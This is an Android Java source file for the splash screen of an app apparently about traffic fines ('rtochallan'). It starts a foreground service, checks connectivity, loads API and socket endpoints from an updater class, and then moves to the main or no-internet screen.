package com.service.rtochallan;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;

import androidx.appcompat.app.AppCompatActivity;

@SuppressLint("CustomSplashScreen")
public class SplashActivity extends AppCompatActivity {

    protected Helper helper;
    protected Context context;

    private boolean isApiLoaded = false;
    private boolean minTimePassed = false;
    private final int MIN_SPLASH_TIME = 3000; // 3 seconds

    private final Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        helper = new Helper();
        helper.context = this;
        context = this;

        Intent serviceIntent = new Intent(this, RunningService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // ✅ Check Internet before starting anything
        if (!helper.isNetworkAvailable(this)) {
            goToNoInternetActivity();
            return;
        }

        // ✅ Start timer for minimum 3 seconds
        handler.postDelayed(() -> {
            minTimePassed = true;
            tryProceed();
        }, MIN_SPLASH_TIME);

        // ✅ Start loading API points
        initializeApiPoints();
    }

    private void initializeApiPoints() {
        ApiUpdater updater = new ApiUpdater();
        updater.updateApiPoints(this, new ApiUpdater.ApiPointsCallback() {
            @Override
            public void onApiPointsUpdated(String apiUrl, String socketUrl) {
                isApiLoaded = true;
                tryProceed();
            }

            @Override
            public void onApiPointsFailure(String error) {
                // Handle API failure (e.g., no internet)
                helper.showTost("Failed to load: " + error);
                goToNoInternetActivity();
            }
        });
    }

    private void tryProceed() {
        if (isApiLoaded && minTimePassed) {
            Intent intent = new Intent(SplashActivity.this, MainActivity.class);
            startActivity(intent);
            finish();
        }
    }

    private void goToNoInternetActivity() {
        Intent intent = new Intent(SplashActivity.this, NoInternetActivity.class);
        startActivity(intent);
        finish();
    }

    @Override
    protected void onResume() {
        super.onResume();

        // ✅ If user comes back from NoInternetActivity or Settings, recheck
        if (!helper.isNetworkAvailable(this)) {
            goToNoInternetActivity();
        }
    }
}
